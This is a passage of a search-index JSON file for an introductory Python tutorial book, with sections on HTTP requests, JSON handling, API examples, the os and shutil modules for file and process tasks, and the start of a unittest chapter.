    "title": "10  Introduction to API Interactions with Python",
    "section": "11.9 Error Handling",
    "text": "11.9 Error Handling\nThe requests module provides built-in exception handling for common HTTP errors.\ntry:\n    response = requests.get('https://api.example.com/data')\n    response.raise_for_status()\nexcept requests.exceptions.HTTPError as err:\n    print(f'HTTP error occurred: {err}')\nexcept requests.exceptions.ConnectionError as err:\n    print(f'Connection error occurred: {err}')\nexcept requests.exceptions.Timeout as err:\n    print(f'Timeout error occurred: {err}')\nexcept requests.exceptions.RequestException as err:\n    print(f'An error occurred: {err}')",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#advanced-usage",
    "href": "09_python_api_interaction.html#advanced-usage",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.10 Advanced Usage",
    "text": "11.10 Advanced Usage\n\n11.10.1 Streaming Downloads\nFor large files, you can stream the content to avoid loading it all into memory at once.\nurl = 'https://example.com/largefile.zip'\nwith requests.get(url, stream=True) as response:\n    response.raise_for_status()\n    with open('largefile.zip', 'wb') as f:\n        for chunk in response.iter_content(chunk_size=8192):\n            f.write(chunk)\n\n\n11.10.2 Uploading Files\nYou can upload files using the files parameter.\nfiles = {'file': open('report.csv', 'rb')}\nresponse = requests.post('https://api.example.com/upload', files=files)\nprint(response.text)\n\n\n11.10.3 Custom Transport Adapters\nYou can create custom transport adapters for specific needs.\nfrom requests.adapters import HTTPAdapter\nfrom requests.packages.urllib3.util.retry import Retry\n\nclass MyAdapter(HTTPAdapter):\n    def init_poolmanager(self, *args, **kwargs):\n        kwargs['retries'] = Retry(total=10, backoff_factor=0.1)\n        super(MyAdapter, self).init_poolmanager(*args, **kwargs)\n\nsession = requests.Session()\nsession.mount('https://', MyAdapter())\n\nresponse = session.get('https://api.example.com/data')\nprint(response.text)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#conclusion-1",
    "href": "09_python_api_interaction.html#conclusion-1",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.11 Conclusion",
    "text": "11.11 Conclusion\nThe requests module is a powerful and flexible library for making HTTP requests in Python. This tutorial covered the basics of making requests, handling responses, customizing requests, and using advanced features like streaming downloads and file uploads. By mastering the requests module, you can easily interact with web services and APIs in your Python applications.",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#table-of-contents-1",
    "href": "09_python_api_interaction.html#table-of-contents-1",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.1 Table of Contents",
    "text": "12.1 Table of Contents\n\nIntroduction to JSON\nInstalling json\nBasic Usage\n\nParsing JSON Data\nSerializing Data to JSON\n\nInteracting with APIs\n\nSending JSON Data\nReceiving JSON Data\n\nAdvanced Usage\n\nCustom Serialization\nCustom Deserialization\nWorking with Complex Data Structures\n\nError Handling\nPractical Examples\n\nExample 1: GitHub API\nExample 2: OpenWeatherMap API\n\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#introduction-to-json",
    "href": "09_python_api_interaction.html#introduction-to-json",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.2 Introduction to JSON",
    "text": "12.2 Introduction to JSON\nJSON (JavaScript Object Notation) is a lightweight data interchange format that is easy to read and write. It is used extensively in APIs to exchange data between servers and clients. JSON data consists of key-value pairs, arrays, and nested objects.",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#installing-json",
    "href": "09_python_api_interaction.html#installing-json",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.3 Installing json",
    "text": "12.3 Installing json\nThe json module is included in Python’s standard library, so you don’t need to install it separately. You can start using it by simply importing it:\nimport json",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#basic-usage",
    "href": "09_python_api_interaction.html#basic-usage",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.4 Basic Usage",
    "text": "12.4 Basic Usage\n\n12.4.1 Parsing JSON Data\nTo parse JSON data (convert JSON string to Python dictionary), use the json.loads() function:\nimport json\n\njson_data = '{\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}'\nparsed_data = json.loads(json_data)\nprint(parsed_data)  # Output: {'name': 'John', 'age': 30, 'city': 'New York'}\nYou can also parse JSON data from a file using the json.load() function:\nimport json\n\nwith open('data.json', 'r') as file:\n    parsed_data = json.load(file)\nprint(parsed_data)\n\n\n12.4.2 Serializing Data to JSON\nTo serialize Python data structures (like dictionaries and lists) to JSON, use the json.dumps() function:\nimport json\n\ndata = {\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}\njson_data = json.dumps(data)\nprint(json_data)  # Output: {\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}\nYou can also serialize data to a JSON file using the json.dump() function:\nimport json\n\ndata = {\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}\nwith open('data.json', 'w') as file:\n    json.dump(data, file)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#interacting-with-apis",
    "href": "09_python_api_interaction.html#interacting-with-apis",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.5 Interacting with APIs",
    "text": "12.5 Interacting with APIs\n\n12.5.1 Sending JSON Data\nWhen interacting with APIs, you often need to send JSON data in HTTP requests. This can be done using the requests module along with the json module:\nimport requests\nimport json\n\nurl = 'https://api.example.com/data'\ndata = {\"name\": \"John\", \"age\": 30}\nheaders = {'Content-Type': 'application/json'}\n\nresponse = requests.post(url, data=json.dumps(data), headers=headers)\nprint(response.status_code)\nprint(response.text)\nAlternatively, the requests module provides a convenient json parameter to automatically handle JSON serialization:\nimport requests\n\nurl = 'https://api.example.com/data'\ndata = {\"name\": \"John\", \"age\": 30}\n\nresponse = requests.post(url, json=data)\nprint(response.status_code)\nprint(response.text)\n\n\n12.5.2 Receiving JSON Data\nWhen receiving JSON data from an API, you can parse the JSON response using the json method provided by the requests module:\nimport requests\n\nurl = 'https://api.example.com/data'\nresponse = requests.get(url)\nparsed_data = response.json()\nprint(parsed_data)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#advanced-usage-1",
    "href": "09_python_api_interaction.html#advanced-usage-1",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.6 Advanced Usage",
    "text": "12.6 Advanced Usage\n\n12.6.1 Custom Serialization\nSometimes, you need to customize the serialization process, such as handling non-serializable objects. You can achieve this by defining a custom serialization function and passing it to the json.dumps() function using the default parameter:\nimport json\nfrom datetime import datetime\n\ndef custom_serializer(obj):\n    if isinstance(obj, datetime):\n        return obj.isoformat()\n    raise TypeError(\"Type not serializable\")\n\ndata = {\"name\": \"John\", \"birthdate\": datetime(1990, 5, 6)}\njson_data = json.dumps(data, default=custom_serializer)\nprint(json_data)\n\n\n12.6.2 Custom Deserialization\nSimilarly, you can customize the deserialization process by defining a custom deserialization function and passing it to the json.loads() function using the object_hook parameter:\nimport json\nfrom datetime import datetime\n\ndef custom_deserializer(dct):\n    if 'birthdate' in dct:\n        dct['birthdate'] = datetime.fromisoformat(dct['birthdate'])\n    return dct\n\njson_data = '{\"name\": \"John\", \"birthdate\": \"1990-05-06T00:00:00\"}'\nparsed_data = json.loads(json_data, object_hook=custom_deserializer)\nprint(parsed_data)\n\n\n12.6.3 Working with Complex Data Structures\nThe json module can handle complex data structures, including nested dictionaries and lists. Here’s an example of serializing and deserializing a complex data structure:\nimport json\n\ndata = {\n    \"name\": \"John\",\n    \"age\": 30,\n    \"address\": {\n        \"street\": \"123 Main St\",\n        \"city\": \"New York\"\n    },\n    \"phones\": [\"123-456-7890\", \"987-654-3210\"]\n}\n\n# Serialize to JSON\njson_data = json.dumps(data, indent=4)\nprint(json_data)\n\n# Deserialize from JSON\nparsed_data = json.loads(json_data)\nprint(parsed_data)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#error-handling-2",
    "href": "09_python_api_interaction.html#error-handling-2",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.7 Error Handling",
    "text": "12.7 Error Handling\nWhen working with JSON data, you may encounter various errors. The json module provides specific exceptions to handle these errors gracefully:\n\njson.JSONDecodeError: Raised when there is an error decoding JSON data.\nTypeError: Raised when there is an error serializing non-serializable data.\n\nimport json\n\n# Handling JSON decoding errors\ntry:\n    json_data = '{\"name\": \"John\", \"age\": 30'\n    parsed_data = json.loads(json_data)\nexcept json.JSONDecodeError as e:\n    print(f\"Error decoding JSON: {e}\")\n\n# Handling serialization errors\ntry:\n    data = {\"name\": \"John\", \"age\": 30, \"birthdate\": object()}\n    json_data = json.dumps(data)\nexcept TypeError as e:\n    print(f\"Error serializing data: {e}\")",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#practical-examples",
    "href": "09_python_api_interaction.html#practical-examples",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.8 Practical Examples",
    "text": "12.8 Practical Examples\n\n12.8.1 Example 1: GitHub API\nLet’s create a script that interacts with the GitHub API to fetch user information:\nimport requests\n\ndef get_github_user(username):\n    url = f\"https://api.github.com/users/{username}\"\n    response = requests.get(url)\n    \n    if response.status_code == 200:\n        user_data = response.json()\n        return {\n            \"name\": user_data[\"name\"],\n            \"public_repos\": user_data[\"public_repos\"],\n            \"followers\": user_data[\"followers\"]\n        }\n    else:\n        return None\n\nusername = \"octocat\"\nuser_info = get_github_user(username)\nprint(user_info)\n\n\n12.8.2 Example 2: OpenWeatherMap API\nLet’s create a script that interacts with the OpenWeatherMap API to fetch weather data for a city:\nimport requests\n\ndef get_weather(city, api_key):\n    url = f\"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}\"\n    response = requests.get(url)\n    \n    if response.status_code == 200:\n        weather_data = response.json()\n        return {\n            \"city\": weather_data[\"name\"],\n            \"temperature\": weather_data[\"main\"][\"temp\"],\n            \"weather\": weather_data[\"weather\"][0][\"description\"]\n        }\n    else:\n        return None\n\ncity = \"London\"\napi_key = \"your_api_key\"\nweather_info = get_weather(city, api_key)\nprint(weather_info)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#conclusion-2",
    "href": "09_python_api_interaction.html#conclusion-2",
    "title": "10  Introduction to API Interactions with Python",
    "section": "12.9 Conclusion",
    "text": "12.9 Conclusion\nThe json module in Python is a powerful tool for working with JSON data. It provides simple functions for parsing and serializing JSON data, handling errors, and customizing the serialization and deserialization processes. This tutorial covered the basics and advanced usage of the json module, as well as practical examples of interacting with APIs. By mastering the json module, you can easily work with JSON data in your Python applications and effectively interact with web APIs.",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html",
    "href": "10_python_automated_sys_tasks.html",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "",
    "text": "11.0.1 Interacting with the Operating System using os\nThe os module provides a way to use operating system-dependent functionality, including file and directory operations, environment variables, and system information.",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#importing-the-os-module",
    "href": "10_python_automated_sys_tasks.html#importing-the-os-module",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.1 Importing the os Module",
    "text": "12.1 Importing the os Module\nTo use the os module, you need to import it first:\nimport os",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#file-and-directory-operations",
    "href": "10_python_automated_sys_tasks.html#file-and-directory-operations",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.2 File and Directory Operations",
    "text": "12.2 File and Directory Operations\n\n12.2.1 Working with Directories\n\n12.2.1.1 Get Current Working Directory\nYou can get the current working directory using os.getcwd():\nimport os\n\ncurrent_directory = os.getcwd()\nprint(\"Current Directory:\", current_directory)\n\n\n12.2.1.2 Change Directory\nYou can change the current working directory using os.chdir(path):\nos.chdir('/path/to/directory')\nprint(\"Changed Directory:\", os.getcwd())\n\n\n12.2.1.3 List Directory Contents\nTo list the contents of a directory, use os.listdir(path):\ndirectory_contents = os.listdir('.')\nprint(\"Directory Contents:\", directory_contents)\n\n\n12.2.1.4 Create a Directory\nYou can create a new directory using os.mkdir(path):\nos.mkdir('new_directory')\nprint(\"New Directory Created:\", os.listdir('.'))\n\n\n12.2.1.5 Create Intermediate Directories\nTo create intermediate directories, use os.makedirs(path):\nos.makedirs('parent_directory/child_directory')\nprint(\"Directories Created:\", os.listdir('parent_directory'))\n\n\n12.2.1.6 Remove a Directory\nTo remove a directory, use os.rmdir(path):\nos.rmdir('new_directory')\nprint(\"Directory Removed:\", os.listdir('.'))\nTo remove intermediate directories, use os.removedirs(path):\nos.removedirs('parent_directory/child_directory')\nprint(\"Directories Removed:\", os.listdir('.'))\n\n\n\n12.2.2 Working with Files\n\n12.2.2.1 Create and Write to a File\nTo create and write to a file, you can use standard file handling methods:\nwith open('example.txt', 'w') as file:\n    file.write('Hello, World!')\nprint(\"File Created and Written to:\", os.listdir('.'))\n\n\n12.2.2.2 Remove a File\nTo remove a file, use os.remove(path):\nos.remove('example.txt')\nprint(\"File Removed:\", os.listdir('.'))\n\n\n12.2.2.3 Rename a File\nTo rename a file, use os.rename(src, dst):\nwith open('old_name.txt', 'w') as file:\n    file.write('Hello, World!')\n\nos.rename('old_name.txt', 'new_name.txt')\nprint(\"File Renamed:\", os.listdir('.'))\n\n\n12.2.2.4 Get File Status\nTo get the status of a file, use os.stat(path):\nfile_status = os.stat('new_name.txt')\nprint(\"File Status:\", file_status)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#environment-variables",
    "href": "10_python_automated_sys_tasks.html#environment-variables",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.3 Environment Variables",
    "text": "12.3 Environment Variables\n\n12.3.1 Get Environment Variables\nTo get the value of an environment variable, use os.environ.get(key):\nhome_directory = os.environ.get('HOME')\nprint(\"Home Directory:\", home_directory)\n\n\n12.3.2 Set Environment Variables\nTo set the value of an environment variable, use os.environ[key] = value:\nos.environ['MY_VARIABLE'] = 'my_value'\nprint(\"Environment Variable Set:\", os.environ.get('MY_VARIABLE'))\n\n\n12.3.3 Delete Environment Variables\nTo delete an environment variable, use os.environ.pop(key, default):\nos.environ.pop('MY_VARIABLE', None)\nprint(\"Environment Variable Deleted:\", os.environ.get('MY_VARIABLE'))",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#process-management",
    "href": "10_python_automated_sys_tasks.html#process-management",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.4 Process Management",
    "text": "12.4 Process Management\n\n12.4.1 Get Process ID\nTo get the current process ID, use os.getpid():\nprocess_id = os.getpid()\nprint(\"Process ID:\", process_id)\n\n\n12.4.2 Get Parent Process ID\nTo get the parent process ID, use os.getppid():\nparent_process_id = os.getppid()\nprint(\"Parent Process ID:\", parent_process_id)\n\n\n12.4.3 Fork a Process\nTo fork a process (UNIX only), use os.fork():\ntry:\n    pid = os.fork()\n    if pid &gt; 0:\n        print(\"Parent process ID:\", os.getpid())\n        print(\"Child process ID:\", pid)\n    else:\n        print(\"Child process ID:\", os.getpid())\n        print(\"Parent process ID:\", os.getppid())\nexcept AttributeError:\n    print(\"Fork not available on this operating system\")\n\n\n12.4.4 Execute a Program\nTo replace the current process with a new one, use os.exec*() methods. For example, os.execl(path, arg0, arg1, ...):\nimport sys\n\nif len(sys.argv) == 1:\n    print(\"Starting new process\")\n    os.execl(sys.executable, sys.executable, *sys.argv, 'child')\nelse:\n    print(\"Running in child process\")\n\n\n12.4.5 Wait for a Child Process\nTo wait for a child process to terminate, use os.wait():\npid = os.fork()\nif pid &gt; 0:\n    os.wait()\n    print(\"Child process terminated\")\nelse:\n    print(\"In child process\")\n    sys.exit(0)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#miscellaneous-os-operations",
    "href": "10_python_automated_sys_tasks.html#miscellaneous-os-operations",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.5 Miscellaneous OS Operations",
    "text": "12.5 Miscellaneous OS Operations\n\n12.5.1 Get OS Name\nTo get the name of the operating system, use os.name:\nos_name = os.name\nprint(\"OS Name:\", os_name)\n\n\n12.5.2 Execute a System Command\nTo execute a system command, use os.system(command):\nos.system('echo Hello, World!')\n\n\n12.5.3 Get System Information\nTo get more detailed system information, use os.uname() (UNIX only):\ntry:\n    system_info = os.uname()\n    print(\"System Info:\", system_info)\nexcept AttributeError:\n    print(\"os.uname() not available on this operating system\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#path-manipulations",
    "href": "10_python_automated_sys_tasks.html#path-manipulations",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.6 Path Manipulations",
    "text": "12.6 Path Manipulations\nThe os.path module provides utilities for manipulating file and directory paths.\n\n12.6.1 Join Paths\nTo join paths, use os.path.join(path, *paths):\nfull_path = os.path.join('parent_directory', 'child_directory', 'file.txt')\nprint(\"Full Path:\", full_path)\n\n\n12.6.2 Split Paths\nTo split a path into the directory and file, use os.path.split(path):\ndirectory, file_name = os.path.split('/path/to/file.txt')\nprint(\"Directory:\", directory)\nprint(\"File Name:\", file_name)\n\n\n12.6.3 Get File Extension\nTo get the file extension, use os.path.splitext(path):\nfile_name, file_extension = os.path.splitext('file.txt')\nprint(\"File Name:\", file_name)\nprint(\"File Extension:\", file_extension)\n\n\n12.6.4 Check Path Existence\nTo check if a path exists, use os.path.exists(path):\npath_exists = os.path.exists('/path/to/file.txt')\nprint(\"Path Exists:\", path_exists)\n\n\n12.6.5 Check if Path is a File or Directory\nTo check if a path is a file or directory, use os.path.isfile(path) and os.path.isdir(path):\nis_file = os.path.isfile('/path/to/file.txt')\nis_directory = os.path.isdir('/path/to/directory')\nprint(\"Is File:\", is_file)\nprint(\"Is Directory:\", is_directory)\n\n\n12.6.6 Get Absolute Path\nTo get the absolute path, use os.path.abspath(path):\nabsolute_path = os.path.abspath('file.txt')\nprint(\"Absolute Path:\", absolute_path)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#conclusion-1",
    "href": "10_python_automated_sys_tasks.html#conclusion-1",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "12.7 Conclusion",
    "text": "12.7 Conclusion\nThe os module in Python provides a wide range of functionalities for interacting with the operating system. Whether you need to manage files and directories, work with environment variables, manage processes, or manipulate paths, the os module has you covered. Understanding and utilizing these functions can significantly enhance your ability to create robust and versatile Python programs.",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#importing-the-shutil-module",
    "href": "10_python_automated_sys_tasks.html#importing-the-shutil-module",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.1 Importing the shutil Module",
    "text": "13.1 Importing the shutil Module\nTo use the shutil module, you need to import it first:\nimport shutil",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#copying-files-and-directories-1",
    "href": "10_python_automated_sys_tasks.html#copying-files-and-directories-1",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.2 Copying Files and Directories",
    "text": "13.2 Copying Files and Directories\n\n13.2.1 Copy a File\nTo copy a file from one location to another, use shutil.copy(src, dst). This function copies the content and permissions of the source file to the destination file.\nimport shutil\n\nshutil.copy('source_file.txt', 'destination_file.txt')\nprint(\"File copied successfully\")\n\n\n13.2.2 Copy a File with Metadata\nTo copy a file along with its metadata (like permissions, last access time, etc.), use shutil.copy2(src, dst):\nshutil.copy2('source_file.txt', 'destination_file_with_metadata.txt')\nprint(\"File copied with metadata successfully\")\n\n\n13.2.3 Copy a Directory\nTo copy an entire directory tree, use shutil.copytree(src, dst). This function recursively copies an entire directory tree rooted at src to a directory named dst.\nshutil.copytree('source_directory', 'destination_directory')\nprint(\"Directory copied successfully\")\n\n\n13.2.4 Copy Only Directory Structure\nTo copy only the directory structure without files, you can use the ignore parameter of shutil.copytree:\ndef ignore_files(dir, files):\n    return [f for f in files if os.path.isfile(os.path.join(dir, f))]\n\nshutil.copytree('source_directory', 'destination_directory_structure', ignore=ignore_files)\nprint(\"Directory structure copied successfully\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#moving-files-and-directories",
    "href": "10_python_automated_sys_tasks.html#moving-files-and-directories",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.3 Moving Files and Directories",
    "text": "13.3 Moving Files and Directories\nTo move a file or directory from one location to another, use shutil.move(src, dst):\nshutil.move('source_file.txt', 'destination_file.txt')\nprint(\"File moved successfully\")\nYou can also move entire directories:\nshutil.move('source_directory', 'destination_directory')\nprint(\"Directory moved successfully\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#deleting-files-and-directories",
    "href": "10_python_automated_sys_tasks.html#deleting-files-and-directories",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.4 Deleting Files and Directories",
    "text": "13.4 Deleting Files and Directories\n\n13.4.1 Delete a File\nTo delete a file, use os.remove(path) from the os module:\nimport os\n\nos.remove('file_to_delete.txt')\nprint(\"File deleted successfully\")\n\n\n13.4.2 Delete a Directory\nTo delete a directory tree, use shutil.rmtree(path):\nshutil.rmtree('directory_to_delete')\nprint(\"Directory deleted successfully\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#file-permissions",
    "href": "10_python_automated_sys_tasks.html#file-permissions",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.5 File Permissions",
    "text": "13.5 File Permissions\n\n13.5.1 Change File Permissions\nTo change the mode (permissions) of a file, use os.chmod(path, mode) from the os module:\nimport os\n\nos.chmod('file.txt', 0o755)  # Sets file permissions to rwxr-xr-x\nprint(\"File permissions changed successfully\")\n\n\n13.5.2 Copy File Permissions\nTo copy the permissions of one file to another, use shutil.copymode(src, dst):\nshutil.copymode('source_file.txt', 'destination_file.txt')\nprint(\"File permissions copied successfully\")\n\n\n13.5.3 Copy File Metadata\nTo copy the metadata of one file to another, use shutil.copystat(src, dst):\nshutil.copystat('source_file.txt', 'destination_file.txt')\nprint(\"File metadata copied successfully\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#archiving-operations",
    "href": "10_python_automated_sys_tasks.html#archiving-operations",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.6 Archiving Operations",
    "text": "13.6 Archiving Operations\n\n13.6.1 Create Archive Files\nTo create an archive file (like .zip or .tar), use shutil.make_archive(base_name, format, root_dir):\nshutil.make_archive('archive_name', 'zip', 'directory_to_archive')\nprint(\"Archive created successfully\")\nYou can create archives in different formats like ‘zip’, ‘tar’, ‘gztar’, ‘bztar’, or ‘xztar’.\n\n\n13.6.2 Extract Archive Files\nTo extract an archive file, use the tarfile or zipfile module. For example, to extract a .zip file:\nimport zipfile\n\nwith zipfile.ZipFile('archive_name.zip', 'r') as zip_ref:\n    zip_ref.extractall('extracted_directory')\nprint(\"Archive extracted successfully\")",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#disk-usage",
    "href": "10_python_automated_sys_tasks.html#disk-usage",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.7 Disk Usage",
    "text": "13.7 Disk Usage\n\n13.7.1 Get Disk Usage Statistics\nTo get disk usage statistics, use shutil.disk_usage(path). This function returns a named tuple with attributes total, used, and free, which are the total, used, and free space on the disk, respectively.\ndisk_usage = shutil.disk_usage('/')\nprint(\"Total:\", disk_usage.total)\nprint(\"Used:\", disk_usage.used)\nprint(\"Free:\", disk_usage.free)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#temporary-files-and-directories",
    "href": "10_python_automated_sys_tasks.html#temporary-files-and-directories",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.8 Temporary Files and Directories",
    "text": "13.8 Temporary Files and Directories\n\n13.8.1 Create Temporary Files and Directories\nTo create temporary files and directories, use the tempfile module. For example, to create a temporary file:\nimport tempfile\n\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Hello, World!')\n    print(\"Temporary file created:\", temp_file.name)\nTo create a temporary directory:\nwith tempfile.TemporaryDirectory() as temp_dir:\n    print(\"Temporary directory created:\", temp_dir)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#example-use-cases",
    "href": "10_python_automated_sys_tasks.html#example-use-cases",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.9 Example Use Cases",
    "text": "13.9 Example Use Cases\n\n13.9.1 Example 1: Backup a Directory\nimport shutil\nimport os\nimport time\n\n# Source and backup directories\nsource_dir = 'source_directory'\nbackup_dir = 'backup_directory'\n\n# Create a backup directory with a timestamp\ntimestamp = time.strftime('%Y%m%d%H%M%S')\nbackup_dir = os.path.join(backup_dir, timestamp)\nshutil.copytree(source_dir, backup_dir)\nprint(\"Backup created successfully at\", backup_dir)\n\n\n13.9.2 Example 2: Clean Up Old Backups\nimport shutil\nimport os\nimport time\n\nbackup_dir = 'backup_directory'\ndays_to_keep = 7\nnow = time.time()\n\nfor filename in os.listdir(backup_dir):\n    file_path = os.path.join(backup_dir, filename)\n    if os.path.isdir(file_path):\n        file_creation_time = os.path.getctime(file_path)\n        if (now - file_creation_time) // (24 * 3600) &gt;= days_to_keep:\n            shutil.rmtree(file_path)\n            print(\"Deleted old backup:\", file_path)",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "10_python_automated_sys_tasks.html#conclusion-2",
    "href": "10_python_automated_sys_tasks.html#conclusion-2",
    "title": "11  Introduction to Automating System Tasks with Python",
    "section": "13.10 Conclusion",
    "text": "13.10 Conclusion\nThe shutil module in Python provides a powerful and convenient way to handle high-level file operations. Whether you need to copy, move, or delete files and directories, manage file permissions, or create and extract archives, the shutil module has you covered. Understanding and utilizing these functions can significantly simplify your file management tasks in Python.",
    "crumbs": [
      "<span class='chapter-number'>11</span>  <span class='chapter-title'>Introduction to Automating System Tasks with Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html",
    "href": "11_python_testing.html",
    "title": "12  Introduction to Testing in Python",
    "section": "",
    "text": "12.0.1 Unit Testing with unittest\nunittest is Python’s built-in library for writing and running tests. It supports test discovery, setup, teardown, and provides assertions for verifying the correctness of your code.",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#importing-the-unittest-module",
    "href": "11_python_testing.html#importing-the-unittest-module",
    "title": "12  Introduction to Testing in Python",
    "section": "13.1 Importing the unittest Module",
    "text": "13.1 Importing the unittest Module\nTo use the unittest module, you need to import it first:\nimport unittest",
    "crumbs": [
      "<span class='chapter-number'>12</span>  <span class='chapter-title'>Introduction to Testing in Python</span>"
    ]
  },
  {
    "objectID": "11_python_testing.html#basic-structure-of-a-test-case-1",
    "href": "11_python_testing.html#basic-structure-of-a-test-case-1",
    "title": "12  Introduction to Testing in Python",
